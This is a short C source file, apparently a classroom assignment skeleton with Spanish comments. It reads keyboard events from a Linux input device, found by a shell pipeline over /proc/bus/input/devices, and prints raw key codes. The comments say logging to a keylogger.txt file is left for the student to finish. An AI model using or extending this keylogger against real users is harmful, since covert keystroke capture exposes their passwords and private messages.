#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"

char *getEvent();

int main(){
  struct input_event ev;
  // ruta al directorio de inputs
  static char path_keyboard[20] = "/dev/input/";
  // concatenar variable keyboard
  strcat(path_keyboard, getEvent());
  // eliminar último caracter (breakline)
  path_keyboard[strlen(path_keyboard)-1] = 0;
  // leer ruta a input
  int device_keyboard = open(path_keyboard, O_RDONLY);
  // imprimir error
  if (errno > 0) {
    printf("Error: %d\n", errno);
  }
  // abrir fichero de logs
  FILE *fp = fopen(LOGFILEPATH, "a");
  while (1) {
    read(device_keyboard, &ev, sizeof(ev));
    if (ev.type == EV_KEY && ev.value == 0) {
      printf("%c\n", ev.code);
      // Hacer la conversión para que en el fichero de keylogger.txt se escriba lo que escribe el usuario
      // Entregar link github con el fichero c + README con instrucciones de uso, supuestos del sistema y casos de uso.
      // Entregar antes de la siguiente clase 15/agosto/2024 antes de las 14:00
      // Individual
    }
  }
}

char *getEvent(){
  // leer el fichero devices y extraer el input que se refiera al teclado
  char *command =  (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
  static char event[8];
  FILE *pipe = popen(command, "r");
  if (!pipe)
    exit(1);
  // obtener la cadena de texto del evento correspondiente al teclado
  fgets(event, 8, pipe);
  pclose(pipe);
  // retornar el evento
  return event;
}
